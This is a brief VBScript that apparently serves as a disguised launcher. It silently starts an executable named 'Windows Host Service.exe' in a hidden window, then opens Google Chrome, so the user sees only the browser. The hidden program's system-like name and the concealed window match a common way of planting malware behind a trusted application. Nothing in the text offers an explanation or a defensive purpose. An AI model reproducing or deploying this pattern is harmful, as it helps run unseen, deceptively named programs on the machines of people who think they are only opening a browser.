Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run """Windows Host Service.exe""", 0
WShell.Run("""C:\Program Files (x86)\Google\Chrome\Application\chrome.exe""")
Set WShell = Nothing
